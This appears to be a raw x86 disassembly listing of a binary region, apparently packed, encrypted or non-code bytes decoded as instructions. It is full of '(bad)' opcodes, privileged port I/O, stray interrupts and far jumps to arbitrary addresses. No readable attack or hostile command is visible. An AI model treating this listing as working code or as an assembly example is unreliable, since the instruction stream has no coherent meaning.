  411e16:	int    0xec
  411e18:	lods   al,BYTE PTR ds:[esi]
  411e19:	push   ss
  411e1a:	(bad)  
  411e1b:	sub    BYTE PTR [edi-0x46],dl
  411e1e:	dec    esp
  411e1f:	add    BYTE PTR [ebp+0x3d],bh
  411e22:	mov    ds:0x31a516f2,al
  411e27:	mov    WORD PTR [edx+0x23bb12f],es
  411e2d:	jmp    0xa5b1:0x58e8ff2f
  411e34:	push   ebx
  411e35:	arpl   WORD PTR [edx-0x7f],di
  411e38:	fiadd  DWORD PTR [ecx+0x75c20e28]
  411e3e:	jl     0x411de6
  411e40:	inc    eax
  411e41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e42:	or     eax,0x15174f0f
  411e47:	icebp  
  411e48:	fdiv   QWORD PTR [edi]
  411e4a:	push   edi
  411e4b:	dec    esi
  411e4c:	jge    0x411eb6
  411e4e:	clc    
  411e4f:	imul   ecx,DWORD PTR [edx],0xbbf98bb3
  411e55:	icebp  
  411e56:	jge    0x411e8d
  411e58:	jb     0x411df0
  411e5a:	out    dx,al
  411e5b:	or     edi,DWORD PTR ds:[edx+0x66]
  411e5f:	(bad)  
  411e60:	push   edx
  411e61:	mov    ebx,ds
  411e63:	or     eax,0x259c306e
  411e68:	nop
  411e69:	mov    al,0x25
  411e6b:	lahf   
  411e6c:	dec    ebx
  411e6d:	cdq    
  411e6e:	adc    eax,0x5ea203f4
  411e73:	shl    dh,0xd4
  411e76:	pop    edx
  411e77:	and    esp,ecx
  411e79:	pop    ss
  411e7a:	iret   
  411e7b:	hlt    
  411e7c:	dec    ebp
  411e7d:	je     0x411e6e
  411e7f:	pusha  
  411e80:	cmp    al,0xbd
  411e82:	push   esp
  411e83:	fbstp  TBYTE PTR [ebx-0xe]
  411e86:	es jb  0x411e0b
  411e89:	xchg   edi,eax
  411e8a:	lds    edx,FWORD PTR [esi]
  411e8c:	add    DWORD PTR [ecx+0x2e],ebp
  411e8f:	pop    ss
  411e90:	push   cs
  411e91:	xchg   ebx,eax
  411e92:	mov    dh,0x70
  411e94:	add    BYTE PTR [eax*4-0x519b9699],cl
  411e9b:	mov    ebx,0x7f8d6133
  411ea0:	cmp    DWORD PTR [ecx],ecx
  411ea2:	mov    ds:0xfe392e6,al
  411ea7:	clc    
  411ea8:	stos   DWORD PTR es:[edi],eax
  411ea9:	cdq    
  411eaa:	fiadd  WORD PTR [eax+0x6f2fe5c8]
  411eb0:	jmp    0x411e6d
  411eb2:	jno    0x411e41
  411eb4:	pop    ebx
  411eb5:	fidivr DWORD PTR [edi+0x46]
  411eb8:	mov    WORD PTR [eax],fs
  411eba:	xor    dh,BYTE PTR [edi]
  411ebc:	popf   
  411ebd:	xchg   ecx,eax
  411ebe:	stos   DWORD PTR es:[edi],eax
  411ebf:	xchg   esi,eax
  411ec0:	push   0x15
  411ec2:	aas    
  411ec3:	or     BYTE PTR [eax+0x3a],ah
  411ec6:	loop   0x411ea9
  411ec8:	int3   
  411ec9:	data16 mov dh,0x41
  411ecc:	(bad)  
  411ecd:	cmp    al,dh
  411ecf:	cli    
  411ed0:	dec    ebp
  411ed1:	repz fsub st(6),st
  411ed4:	cwde   
  411ed5:	js     0x411f25
  411ed7:	xor    ah,ch
  411ed9:	or     DWORD PTR ds:0x9b0431e7,0x50
  411ee0:	and    BYTE PTR [eax],dl
  411ee2:	dec    esi
  411ee3:	adc    al,0xc2
  411ee5:	je     0x411ea1
  411ee7:	ja     0x411ecc
  411ee9:	lods   al,BYTE PTR ds:[esi]
  411eea:	jbe    0x411eb1
  411eec:	xchg   DWORD PTR [ebx],ebx
  411eee:	addr16 (bad) 
  411ef0:	aad    0xd3
  411ef2:	int    0xb7
  411ef4:	xchg   DWORD PTR [ebx],ecx
  411ef6:	xor    al,0x38
  411ef9:	in     eax,0x13
  411efb:	aam    0xda
  411efd:	xchg   esi,eax
  411efe:	mov    ch,0xe2
  411f00:	nop
  411f01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f02:	int3   
  411f03:	test   DWORD PTR [edx+0x13c051df],ebx
  411f09:	or     dl,BYTE PTR [ebx-0x4b]
  411f0c:	repz repz loope 0x411eed
  411f10:	inc    ebx
  411f11:	adc    al,0x39
  411f13:	jmp    0x772438e2
  411f18:	cdq    
  411f19:	adc    bl,dl
  411f1b:	add    eax,0x5195701
  411f20:	add    eax,0xf9c4226f
  411f25:	and    DWORD PTR [edx],0xf7d11dae
  411f2b:	bnd jb 0x411f07
  411f2e:	shr    BYTE PTR [eax+0x4e766be5],0xdd
  411f35:	pop    edx
  411f36:	into   
  411f37:	mul    BYTE PTR [ecx+eiz*2+0x22]
  411f3b:	lea    ebx,[ebx-0x25]
  411f3e:	and    ah,dh
  411f40:	xchg   BYTE PTR [esi+0xd25d6de],dl
  411f46:	jno    0x411ef9
  411f48:	outs   dx,BYTE PTR ds:[esi]
  411f49:	xor    al,0xd0
  411f4b:	scas   eax,DWORD PTR es:[edi]
  411f4c:	inc    edi
  411f4d:	sbb    BYTE PTR [ecx],dh
  411f4f:	loope  0x411ee5
  411f51:	xchg   edi,eax
  411f52:	aaa    
  411f53:	sbb    al,BYTE PTR [ebp-0x6deaca4b]
  411f59:	cmp    DWORD PTR [esp+ebx*1-0x5f],0x19127438
  411f61:	or     BYTE PTR [ecx+0x32],ch
  411f64:	ret    
  411f65:	shl    BYTE PTR [edi],0xe4
  411f68:	and    al,0x18
  411f6a:	jcxz   0x411f2c
  411f6d:	stc    
  411f6e:	pusha  
  411f6f:	sbb    al,0xe5
  411f71:	xchg   ebx,eax
  411f72:	fimul  WORD PTR [edi+0x6c]
  411f75:	or     eax,0x46fffff7
  411f7a:	xchg   BYTE PTR [edi],ch
  411f7c:	lods   eax,DWORD PTR ds:[esi]
  411f7d:	(bad)  
  411f7e:	or     edi,esi
  411f80:	enter  0x38b,0x91
  411f84:	pop    ss
  411f85:	and    BYTE PTR [edi],al
  411f87:	inc    edx
  411f88:	mov    dl,0xcf
  411f8a:	test   DWORD PTR [eax+edi*4],esi
  411f8d:	sub    ebx,DWORD PTR [edx]
  411f8f:	arpl   ax,cx
  411f91:	pop    es
  411f92:	xchg   edi,eax
  411f93:	retf   0x7e96
  411f96:	call   0x3765:0x302e904c
  411f9d:	jg     0x411f99
  411f9f:	sub    eax,0xd1b87cab
  411fa4:	scas   al,BYTE PTR es:[edi]
  411fa5:	push   edi
  411fa6:	push   ecx
  411fa7:	pop    esp
  411fa8:	xchg   esi,eax
  411fa9:	jae    0x411ff1
  411fab:	div    BYTE PTR [eax-0x50daf009]
  411fb1:	xchg   esi,eax
  411fb2:	imul   ebp,ecx,0x23
  411fb5:	xchg   edx,eax
  411fb6:	pop    ecx
  411fb7:	ja     0x411fbb
  411fb9:	pop    esp
  411fba:	jno    0x411f95
  411fbc:	aad    0xe7
  411fbe:	inc    edi
  411fbf:	jno    0x41201b
  411fc1:	repnz mov edx,?
  411fc4:	inc    eax
  411fc5:	or     DWORD PTR fs:[ebp+eiz*8+0x1d80115a],0x336105cb
  411fd1:	sbb    eax,0x6099c115
  411fd6:	jb     0x412041
  411fd8:	mov    bh,0x22
  411fda:	xchg   ch,bh
  411fdc:	lea    ebp,ds:0x4770ab47
  411fe2:	pop    ebx
  411fe3:	in     eax,0xb6
  411fe5:	call   0x43f9:0xeddcbb4e
  411fec:	push   ecx
  411fed:	loop   0x412001
  411fef:	push   es
  411ff0:	xor    BYTE PTR [eax-0x2def937f],dh
  411ff6:	stos   BYTE PTR es:[edi],al
  411ff7:	add    bh,BYTE PTR [edi]
  411ff9:	push   edi
  411ffa:	addr16 sahf 
  411ffc:	sbb    dl,BYTE PTR [edx-0x1d21c4a2]
  412002:	xor    BYTE PTR [edi+0x55c5b371],dl
  412008:	xchg   ebx,eax
  412009:	or     eax,esp
  41200b:	and    DWORD PTR [ebp-0x43],ecx
  41200e:	(bad)  
  41200f:	pop    ebp
  412010:	push   edi
  412011:	push   cs
  412012:	dec    esi
  412013:	mov    esp,DWORD PTR [esi]
  412015:	clc    
  412016:	test   al,0x79
  412018:	mov    BYTE PTR [ebx-0x28],al
  41201b:	out    dx,eax
  41201c:	data16 fstp st(3)
  41201f:	sbb    BYTE PTR [edi-0x2dc1b5bd],0xd1
  412026:	xor    BYTE PTR [ecx],cl
  412028:	pop    eax
  412029:	xchg   esi,eax
  41202a:	into   
  41202b:	mov    al,0xbd
  41202d:	xchg   esp,eax
  41202e:	push   0xb
  412030:	jne    0x411ff6
  412032:	(bad)  
  412033:	ficom  WORD PTR [ebx+0x6d]
  412036:	dec    eax
  412037:	push   eax
  412038:	cdq    
  412039:	sub    al,0x36
  41203b:	div    ah
  41203d:	push   cs
  41203e:	push   ebx
  41203f:	out    dx,al
  412040:	clc    
  412041:	xor    edi,DWORD PTR [esi]
  412043:	test   edx,ecx
  412045:	fnstenv [edx+ecx*1-0x59b02388]
  41204c:	loope  0x411fe2
  41204e:	pop    ebp
  41204f:	out    dx,eax
  412050:	mov    DWORD PTR [edx],ebp
  412052:	pushf  
  412053:	mov    ds:0x5d56ba48,al
  412058:	shl    BYTE PTR [edi-0x2d],1
  41205b:	jp     0x4120b6
  41205d:	jns    0x41206a
  41205f:	je     0x41208f
  412061:	(bad)  
  412062:	cli    
  412063:	sbb    edx,DWORD PTR [eax-0x31]
  412066:	xchg   ecx,eax
  412067:	add    DWORD PTR [eax+0x48],ebp
  41206a:	retf   0x1b31
  41206d:	outs   dx,DWORD PTR ds:[esi]
  41206e:	push   es
  41206f:	outs   dx,BYTE PTR ds:[esi]
  412070:	xor    BYTE PTR [ebp-0x71],dh
  412073:	ds inc edx
  412075:	add    ch,BYTE PTR [ecx-0x1c]
  412078:	jge    0x4120ad
  41207a:	xor    bh,BYTE PTR [ebp-0x4e18e5eb]
  412080:	sub    DWORD PTR [eax-0x7493310],0xd8aa209a
  41208a:	pop    edx
  41208b:	subps  xmm6,XMMWORD PTR [ecx+0x3a8b873d]
  412092:	sbb    ecx,DWORD PTR [ebp+0x7d]
  412095:	mov    eax,ds:0x4f01451c
  41209a:	loope  0x412087
  41209c:	pop    es
  41209d:	adc    eax,0x6c1ede06
  4120a2:	mov    ds:0xcb848beb,al
  4120a7:	pop    ecx
  4120a8:	lds    ebx,FWORD PTR [ebp-0x4]
  4120ab:	div    DWORD PTR [ecx-0xa]
  4120ae:	jbe    0x412055
  4120b0:	or     cl,ch
  4120b2:	retf   0x15b5
  4120b5:	pop    eax
  4120b6:	pusha  
  4120b7:	cmp    DWORD PTR [ebx+ecx*2-0x49],edi
  4120bb:	jmp    0xcebb:0xde574377
  4120c2:	fiadd  DWORD PTR [edi+0x7a9fbd86]
  4120c8:	cmp    ecx,DWORD PTR [ebx]
  4120ca:	mov    esp,0x7d3eb430
  4120cf:	lods   eax,DWORD PTR ds:[esi]
  4120d0:	push   ebp
  4120d1:	mov    esi,0x2654a5f9
  4120d6:	jne    0x4120fd
  4120d8:	cwde   
  4120d9:	add    eax,0xeb97789a
  4120de:	mov    ah,0x1d
  4120e0:	fidiv  WORD PTR [edi-0x23]
  4120e3:	cmp    eax,0x6bc59675
  4120e8:	inc    esi
  4120e9:	mov    ebx,0xc84724b9
  4120ee:	inc    ebx
  4120ef:	fnsave [edi-0x6b67ddf]
  4120f5:	stos   DWORD PTR es:[edi],eax
  4120f6:	in     al,0xd9
  4120f8:	xor    BYTE PTR [ebp-0x10ac79ba],dl
  4120fe:	int3   
  4120ff:	pop    esp
  412100:	imul   edx,DWORD PTR [ecx+ebx*8],0x5a
  412104:	inc    ebp
  412105:	xchg   edi,eax
  412106:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412107:	mov    cl,0xa4
  412109:	inc    eax
  41210a:	in     eax,0x73
  41210c:	jnp    0x412157
  41210e:	test   BYTE PTR [edx],al
  412110:	dec    esi
  412111:	loope  0x4120e4
  412113:	popa   
  412114:	call   0x6729:0xbf5fcbc9
  41211b:	cmp    dl,BYTE PTR [esi+eiz*8-0x6a]
  41211f:	sbb    al,0x1
  412121:	imul   edx,DWORD PTR [eax-0x3e90dd6],0x50bb5864
  41212b:	mov    dh,0x99
  41212d:	and    DWORD PTR [edx-0x99fb9c1],0xf9598a19
  412137:	mov    BYTE PTR gs:[ecx-0x5e0e3d85],dh
  41213e:	push   esi
  41213f:	ds xchg ebp,eax
  412141:	mov    esi,0x1790de34
  412146:	stos   BYTE PTR es:[edi],al
  412147:	stc    
  412148:	sub    DWORD PTR [eax+0x1da7381],edx
  41214e:	mov    cl,0x9a
  412150:	pop    ss
  412151:	ss and al,0xfc
  412154:	mov    sp,0x7026
  412158:	cmp    bl,bl
  41215a:	push   esp
  41215b:	dec    esp
  41215c:	mov    edi,0x51bbd3f2
  412161:	nop
  412162:	cmp    al,bh
  412164:	pop    es
  412165:	pop    ds
  412166:	retf   0x855b
  412169:	pop    ds
  41216a:	sbb    al,0x2f
  41216c:	ins    BYTE PTR es:[edi],dx
  41216d:	jle    0x4121cf
  41216f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412170:	adc    edi,ecx
  412172:	aam    0x98
  412174:	and    DWORD PTR [ebx],eax
  412176:	mov    al,ds:0x6bbaff38
  41217b:	sub    BYTE PTR ds:0xb47fc16,ah
  412181:	push   ebp
  412182:	adc    al,0x25
  412184:	cli    
  412185:	and    eax,0xc192e073
  41218a:	mov    WORD PTR [edi-0x11],es
  41218d:	pop    esp
  41218e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41218f:	pop    ecx
  412190:	mov    ebp,0x6c3a21
  412195:	outs   dx,DWORD PTR ds:[esi]
  412196:	loopne 0x4121db
  412198:	mov    ds:0x3b83f873,eax
  41219d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41219e:	scas   al,BYTE PTR es:[edi]
  41219f:	mov    esi,0x69edea84
  4121a4:	adc    ebp,edx
  4121a6:	sbb    DWORD PTR [edi],ecx
  4121a8:	pop    edx
  4121a9:	loopne 0x412168
  4121ab:	mov    esp,ecx
  4121ad:	ins    BYTE PTR es:[edi],dx
  4121ae:	xchg   ebx,eax
  4121af:	pop    eax
  4121b0:	mov    dh,0x2d
  4121b2:	pop    edi
  4121b3:	push   edi
  4121b4:	les    edx,FWORD PTR [eax+0x4a]
  4121b7:	rol    BYTE PTR [esi+eiz*2+0x153b0ece],0x78
  4121bf:	nop
  4121c0:	dec    esi
  4121c1:	and    DWORD PTR [eax+0x68],esi
  4121c4:	test   al,0x82
  4121c6:	test   al,0x4e
  4121c8:	(bad)  [edx-0x3c84a0f4]
  4121ce:	jmp    0xeaa7:0x6513fb54
  4121d5:	add    eax,0x425acf8
  4121da:	mov    edx,0xe6bc945d
  4121df:	aad    0xe3
  4121e1:	or     ebx,DWORD PTR [ebp+0x1cb2724a]
  4121e7:	ror    BYTE PTR [esi+0x2a],1
  4121ea:	bound  esp,QWORD PTR [esi]
  4121ec:	xchg   edx,eax
  4121ed:	in     eax,0xc9
  4121ef:	inc    esp
  4121f0:	sub    edi,edx
  4121f2:	jno    0x412264
  4121f4:	inc    esi
  4121f5:	cmp    esp,DWORD PTR [esi-0x1e]
  4121f8:	add    DWORD PTR [ebx+0x3b],ebx
  4121fb:	ins    BYTE PTR es:[edi],dx
  4121fc:	in     eax,dx
  4121fd:	repnz cmp eax,0xcd0e9128
  412203:	jo     0x412197
  412205:	cli    
  412206:	adc    bl,ch
  412208:	and    al,0x8b
  41220a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41220b:	cmp    BYTE PTR [ebp+0x419cc804],ah
  412211:	fidiv  WORD PTR [ebx]
  412213:	mov    edx,0x85dbb4a3
  412218:	sub    al,0x83
  41221a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41221b:	sub    al,0xd3
  41221d:	mov    al,0x0
  41221f:	sbb    dl,BYTE PTR [eax+0x5d]
  412222:	xchg   edx,eax
  412223:	ss push edi
  412225:	stc    
  412226:	movzx  esp,WORD PTR [edi-0x7a]
  41222a:	ror    BYTE PTR [edi],cl
  41222c:	add    eax,0xb0e878f0
  412231:	(bad)  
  412232:	mov    ah,0x38
  412234:	and    BYTE PTR [ebx],bl
  412236:	cld    
  412237:	int3   
  412238:	xor    DWORD PTR [ebx-0x6d23a97f],esi
  41223e:	jb     0x412201
  412240:	jl     0x4121c4
  412242:	stos   DWORD PTR es:[edi],eax
  412243:	xlat   BYTE PTR ds:[ebx]
  412244:	jg     0x4121ca
  412246:	mov    cl,0x16
  412248:	mov    ebx,0x9bae9681
  41224d:	retf   0x7981
  412250:	mov    ecx,DWORD PTR [eax+ebp*2-0x2216a43d]
  412257:	aaa    
  412258:	pop    ecx
  412259:	adc    eax,0x80ebec04
  41225e:	xchg   ebx,eax
  41225f:	call   0x84ee:0x22d58b88
  412266:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412267:	dec    ebx
  412268:	mov    WORD PTR [ebp+0x67e61654],cs
  41226e:	pop    esi
  41226f:	mov    ecx,0xa87e3015
  412274:	mov    dh,0x2
  412276:	push   cs
  412277:	fcomp  DWORD PTR [eax]
  412279:	call   0x53cc0332
  41227e:	xor    dh,dl
  412280:	push   0xaf1e0691
  412285:	(bad)  
  412286:	int    0x9a
  412288:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412289:	ds cdq 
  41228b:	sbb    eax,0x540ea5a1
  412290:	pushf  
  412291:	inc    edx
  412292:	sub    eax,0xef02b262
  412297:	lahf   
  412298:	pusha  
  412299:	popf   
  41229a:	mov    ah,0x87
  41229c:	cmc    
  41229d:	sbb    DWORD PTR [eax],0xd2745f3d
  4122a3:	push   ebp
  4122a4:	sub    ebx,DWORD PTR [eax]
  4122a6:	or     DWORD PTR [edi],0x6661cd67
  4122ac:	int    0xfb
  4122ae:	xchg   esi,eax
  4122af:	mov    dl,0x70
  4122b1:	shl    BYTE PTR [ebx+0x44a4670f],cl
  4122b7:	xor    BYTE PTR [ecx],dh
  4122b9:	push   esp
  4122ba:	pusha  
  4122bb:	jecxz  0x412288
  4122bd:	call   0xa288:0xc25e9aa1
  4122c4:	adc    al,0x1b
  4122c6:	jne    0x412255
  4122c8:	frstor [ebp+0x21e43186]
  4122ce:	mov    DWORD PTR [eax+0x3eae0a43],0x3206b428
  4122d8:	dec    edx
  4122d9:	popa   
  4122da:	and    bh,0x51
  4122dd:	mov    ah,0x64
  4122df:	pop    esp
  4122e0:	repnz adc ebp,DWORD PTR [ebx+0x38734da7]
  4122e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122e8:	js     0x4122c1
  4122ea:	daa    
  4122eb:	adc    al,BYTE PTR [edi+0x67]
  4122ee:	je     0x412361
  4122f0:	hlt    
  4122f1:	mov    al,ds:0xd469854a
  4122f6:	sti    
  4122f7:	sub    cl,0xf0
  4122fa:	fldcw  WORD PTR [eax-0x3dc4c927]
  412300:	ror    DWORD PTR [edi-0x3f],cl
  412303:	or     ecx,ebx
  412305:	cwde   
  412306:	push   esp
  412307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412308:	sub    eax,0x61ca1f6e
  41230d:	xchg   bl,ch
  41230f:	push   ds
  412310:	xchg   BYTE PTR [edx],ah
  412312:	std    
  412313:	adc    al,0x68
  412315:	aas    
  412316:	sbb    dh,cl
  412318:	lods   al,BYTE PTR ds:[esi]
  412319:	adc    DWORD PTR [ebp+0x231c9c2c],ebp
  41231f:	xchg   ebp,eax
  412320:	les    edx,FWORD PTR [ecx-0x3c]
  412323:	inc    edi
  412324:	add    cl,BYTE PTR [eax+edx*4]
  412327:	cdq    
  412328:	cmp    DWORD PTR ds:[ecx-0x34],edx
  41232c:	sahf   
  41232d:	and    eax,0x1b9bdeb6
  412332:	in     al,dx
  412333:	int    0xa7
  412335:	out    dx,eax
  412336:	jns    0x4122fb
  412338:	pop    esp
  412339:	cmp    BYTE PTR [ecx-0x79],0x8c
  41233d:	(bad)  
  41233e:	xchg   ecx,eax
  41233f:	jne    0x41239a
  412341:	push   ecx
  412342:	xchg   ecx,eax
  412343:	mov    al,BYTE PTR [edx+0x63]
  412346:	in     eax,dx
  412347:	call   0xe2ef03dd
  41234c:	fstp   DWORD PTR [esi+0x67ff1ac1]
  412352:	dec    esi
  412353:	or     esp,ebx
  412355:	fsub   st,st(6)
  412357:	pop    es
  412358:	scas   al,BYTE PTR es:[edi]
  412359:	xor    DWORD PTR [ebx],ecx
  41235b:	cmp    cl,al
  41235d:	cld    
  41235e:	jo     0x4123d3
  412360:	in     al,0x2f
  412362:	call   0xadc:0x23bce38e
  412369:	and    eax,0x375d4a1f
  41236e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41236f:	call   0x84e4:0xd29d92d5
  412376:	xchg   DWORD PTR [edx-0x2e9b993d],ecx
  41237c:	inc    edi
  41237d:	push   esi
  41237e:	ret    0x972a
  412381:	add    dh,BYTE PTR [edx+0x45]
  412384:	ror    DWORD PTR [esi],1
  412386:	pop    esi
  412387:	and    DWORD PTR [ecx+ebp*4+0xb26e781],edi
  41238e:	jno    0x412389
  412390:	pop    ecx
  412391:	arpl   WORD PTR [edx],di
  412393:	push   cs
  412394:	int3   
  412395:	jp     0x41235c
  412397:	(bad)  
  412398:	pop    ds
  412399:	or     al,BYTE PTR [ebx-0x57a8ae60]
  41239f:	sub    ebx,DWORD PTR [edx-0x6162acc8]
  4123a5:	ja     0x4123c7
  4123a7:	mov    ch,0xae
  4123a9:	mov    ebp,0xa8c600ac
  4123ae:	test   DWORD PTR [eax-0x6d2198de],ebx
  4123b4:	jne    0x4123f9
  4123b6:	out    dx,eax
  4123b7:	jp     0x412423
  4123b9:	xchg   esp,eax
  4123ba:	push   0x2ce6e82f
  4123bf:	outs   dx,BYTE PTR ds:[esi]
  4123c0:	loop   0x412354
  4123c2:	bound  ebx,QWORD PTR [ecx+0x1f]
  4123c5:	sub    ecx,esi
  4123c7:	inc    edi
  4123c8:	xchg   esp,eax
  4123c9:	mov    ds:0xc51cb641,al
  4123ce:	mov    cl,0xe2
  4123d0:	dec    ebp
  4123d1:	pop    ecx
  4123d2:	cmp    BYTE PTR [edi-0x41],al
  4123d5:	aad    0x53
  4123d7:	test   ecx,ecx
  4123d9:	test   ecx,ebx
  4123db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123dc:	xchg   DWORD PTR [edx+0x68],edi
  4123df:	jmp    0xc775:0x6a3a1e15
  4123e6:	outs   dx,DWORD PTR ds:[esi]
  4123e7:	mov    cl,bh
  4123e9:	das    
  4123ea:	push   ebp
  4123eb:	push   DWORD PTR [eax+0x1a1b21f1]
  4123f1:	icebp  
  4123f2:	repz lahf 
  4123f4:	or     DWORD PTR [edi],0xd
  4123f7:	fimul  DWORD PTR [edi-0x3]
  4123fa:	rcl    DWORD PTR [ebx],0xaf
  4123fd:	sub    BYTE PTR [edx-0x64],dl
  412400:	dec    edi
  412401:	scas   eax,DWORD PTR es:[edi]
  412402:	pop    esp
  412403:	mov    dl,0x1a
  412405:	adc    eax,0x9e33168d
  41240a:	fidiv  WORD PTR [eax+esi*8]
  41240d:	dec    ecx
  41240e:	mov    cl,0xab
  412410:	in     eax,0x76
  412412:	test   DWORD PTR [eax+0x68],esp
  412415:	cld    
  412416:	and    eax,0xc338e6cf
  41241b:	sbb    ecx,DWORD PTR [ecx]
  41241d:	pusha  
  41241e:	fs mov ecx,0xb0f740bf
  412424:	xor    al,0x2
  412426:	fsubr  st(3),st
  412428:	xor    BYTE PTR [ebp-0x70004c5c],dh
  41242e:	cmp    al,0xca
  412430:	sub    eax,0x4817a0f8
  412435:	retf   0x655
  412438:	cmp    DWORD PTR [ecx+0x5dc95d3f],eax
  41243e:	jne    0x412421
  412440:	fmul   QWORD PTR [esi]
  412442:	test   ah,dh
  412444:	jecxz  0x41242d
  412446:	push   es
  412447:	push   ss
  412448:	xor    dl,BYTE PTR [ecx+0x2c]
  41244b:	mov    edx,0xfa711962
  412450:	cmp    ebx,DWORD PTR ds:[esi-0x301b3cd]
  412457:	aas    
  412458:	ja     0x41240c
  41245a:	push   ebx
  41245b:	stc    
  41245c:	sub    eax,0x11ba78e8
  412461:	xor    ebp,DWORD PTR [edx]
  412463:	in     al,0xc7
  412465:	std    
  412466:	mov    esp,0x6a1f2dfd
  41246b:	popa   
  41246c:	xor    DWORD PTR [ebp-0x164b0a2d],edi
  412472:	mov    bl,BYTE PTR [esi+0xa]
  412475:	stos   BYTE PTR es:[edi],al
  412476:	test   cl,dh
  412478:	sub    DWORD PTR ds:0x5383a6f,edx
  41247e:	cli    
  41247f:	dec    edi
  412480:	pop    edi
  412481:	adc    eax,0x840f37fe
  412486:	(bad)  
  412487:	xor    eax,0xe37f529
  41248c:	sar    cl,1
  41248e:	adc    edi,DWORD PTR [eax]
  412490:	call   DWORD PTR [ecx+0x3a6bbdd0]
  412496:	cdq    
  412497:	push   ss
  412498:	add    al,0xc3
  41249a:	or     bl,bl
  41249c:	cwde   
  41249d:	pop    ss
  41249e:	xchg   esp,eax
  41249f:	xor    ebp,DWORD PTR [esi]
  4124a1:	lods   al,BYTE PTR ds:[esi]
  4124a2:	mov    edi,0xbda8ee69
  4124a7:	xor    al,0xbe
  4124a9:	add    esp,DWORD PTR [eax]
  4124ab:	stc    
  4124ac:	mov    esi,0x6e6de48f
  4124b1:	inc    ebp
  4124b2:	jle    0x4124d0
  4124b4:	repz fbld TBYTE PTR [esi+0x4c]
  4124b8:	push   esi
  4124b9:	push   eax
  4124ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124bb:	xchg   edi,eax
  4124bc:	xchg   edi,eax
  4124bd:	mov    ds:0x5a7c6b8f,eax
  4124c2:	or     ah,dl
  4124c4:	dec    ecx
  4124c5:	jg     0x412456
  4124c7:	add    al,0x6d
  4124c9:	sub    eax,ecx
  4124cb:	mov    eax,ds:0xa915a782
  4124d0:	lea    edi,[esi+0x724f111]
  4124d6:	das    
  4124d7:	xchg   ebp,edx
  4124d9:	popf   
  4124da:	ficomp WORD PTR [eax+0x47665e11]
  4124e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124e1:	or     eax,0xe5e07a3e
  4124e6:	pop    ss
  4124e7:	sub    al,0xfa
  4124e9:	sub    DWORD PTR [eax],ebp
  4124eb:	push   esi
  4124ec:	aas    
  4124ed:	mov    DWORD PTR [ecx+0x170cc802],edi
  4124f3:	xor    al,0xf4
  4124f5:	movaps xmm4,XMMWORD PTR [edi-0x18c10da2]
  4124fc:	inc    edx
  4124fd:	fucomp st(2)
  4124ff:	(bad)  
  412500:	and    BYTE PTR [esi],dl
  412502:	pop    ecx
  412503:	popf   
  412504:	cmp    al,BYTE PTR [edi]
  412506:	lock and edi,DWORD PTR fs:[edx+0x4a00080a]
  41250e:	mov    dh,0xee
  412510:	iret   
  412511:	outs   dx,BYTE PTR ds:[esi]
  412512:	imul   esp,DWORD PTR [ecx],0x776bff1a
  412518:	xchg   ebx,esp
  41251a:	push   edx
  41251b:	pushf  
  41251c:	pop    es
  41251d:	in     al,0x68
  41251f:	fmul   st,st(6)
  412521:	ficomp WORD PTR [ecx-0x4b]
  412524:	xor    BYTE PTR [eax+0x45],dh
  412527:	ja     0x4124ad
  412529:	stos   BYTE PTR es:[edi],al
  41252a:	lea    edi,[edi]
  41252c:	scas   al,BYTE PTR es:[edi]
  41252d:	cmp    eax,0x8ce62d75
  412532:	aas    
  412533:	add    al,0xc9
  412535:	or     esp,DWORD PTR [edx+edi*2+0x11e8f1b]
  41253c:	icebp  
  41253d:	xor    ecx,DWORD PTR [ebp+0x65]
  412540:	push   0xe1e35f49
  412545:	rol    BYTE PTR [ebx],1
  412547:	dec    edi
  412548:	in     eax,0x7d
  41254a:	xchg   ebx,eax
  41254b:	xor    dl,BYTE PTR [ebp+0x70e1e6c]
  412551:	clc    
  412552:	mov    edi,0x99c5b294
  412557:	mov    eax,ds:0xb3cfe704
  41255c:	call   0x225d:0xd2117c32
  412563:	sub    edi,DWORD PTR [ebp-0x7]
  412566:	sub    BYTE PTR [esi],dl
  412568:	fdiv   DWORD PTR [edi+0x22]
  41256b:	int3   
  41256c:	(bad)  
  41256d:	loopne 0x412567
  41256f:	clc    
  412570:	aad    0xda
  412572:	dec    ecx
  412573:	pop    edi
  412574:	mov    esp,0xdd7c2f28
  412579:	mov    esi,0xc6179bce
  41257e:	jo     0x4125ad
  412580:	iret   
  412581:	fwait
  412582:	inc    eax
  412583:	(bad)  
  412584:	or     ah,BYTE PTR [ebx-0x9]
  412587:	jnp    0x41257a
  412589:	dec    ebp
  41258a:	xlat   BYTE PTR ds:[ebx]
  41258b:	mov    esi,0x5233400e
  412590:	inc    ebx
  412591:	push   es
  412592:	jne    0x412581
  412594:	push   esp
  412595:	sub    al,BYTE PTR ds:0x70872e69
  41259b:	xchg   esi,eax
  41259c:	lahf   
  41259d:	cld    
  41259e:	bound  ebx,QWORD PTR [edx+0x13]
  4125a1:	stos   BYTE PTR es:[edi],al
  4125a2:	sti    
  4125a3:	jg     0x4125ff
  4125a5:	jbe    0x412592
  4125a7:	xlat   BYTE PTR ds:[ebx]
  4125a8:	sub    DWORD PTR [ebx+0x1b2b2e73],esi
  4125ae:	dec    ebp
  4125af:	(bad)  
  4125b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125b1:	loope  0x4125c4
  4125b3:	push   DWORD PTR [ebp+0x68]
  4125b6:	repz jge 0x4125f2
  4125b9:	pop    esp
  4125ba:	xlat   BYTE PTR ds:[ebx]
  4125bb:	cmp    BYTE PTR [ebp-0x46],dl
  4125be:	or     BYTE PTR [esi+0x41],dh
